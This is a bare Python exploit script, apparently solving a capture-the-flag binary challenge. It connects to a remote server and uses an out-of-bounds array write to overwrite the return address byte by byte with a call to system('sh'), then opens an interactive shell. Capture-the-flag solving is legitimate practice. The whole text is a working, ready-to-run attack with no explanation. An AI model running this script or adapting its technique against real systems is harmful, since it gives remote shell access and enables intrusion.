#!/usr/bin/python
#coding:utf-8
 
from pwn import*
 
system_addr=0x080485AF
leave_offset=0x84
 
 
def write_addr(addr,va):
	io.sendline("3")
	io.recvuntil("which number to change:\n")
	io.sendline(str(addr))
	io.recvuntil("new number:\n")
	io.sendline(str(va))
	io.recvuntil("5. exit\n")

#111.198.29.45 30245 
io=remote('111.198.29.45','30245')
io.recvuntil("How many numbers you have:\n")
io.sendline("1")
io.recvuntil("Give me your numbers\n")
io.sendline("1")
io.recvuntil("5. exit\n")
 
 
# write  system_addr  0x08048450
 
write_addr(leave_offset,0X50)
write_addr(leave_offset+1,0X84)
write_addr(leave_offset+2,0X04)
write_addr(leave_offset+3,0X08)
# sh_addr  0x08048987
leave_offset+=8
print leave_offset
write_addr(leave_offset,0x87)
write_addr(leave_offset+1,0X89)
write_addr(leave_offset+2,0X04)
write_addr(leave_offset+3,0X08)
 
io.sendline("5")
io.interactive()